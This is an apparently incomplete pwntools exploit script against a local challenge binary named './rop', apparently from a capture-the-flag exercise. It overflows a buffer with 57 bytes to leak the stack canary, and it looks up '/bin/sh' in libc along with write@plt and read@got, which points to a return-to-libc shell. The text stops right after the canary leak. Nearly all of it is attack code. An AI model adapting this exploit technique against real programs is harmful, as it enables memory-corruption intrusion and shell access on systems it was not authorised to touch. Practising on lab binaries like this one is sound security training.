from pwn import *

p = process("./rop")
e = ELF("./rop")
libc = ELF("libc.so.6",checksec=False)

binsh = libc.search(b"/bin/sh")
write_plt = e.plt["write"]
read_got = e.got["read"]


payload = b''
payload += b'a'*57

p.sendafter(": ",payload)
p.recvuntil(payload)
cnry = b'\x00' + p.recvuntil("\n")[:-2]

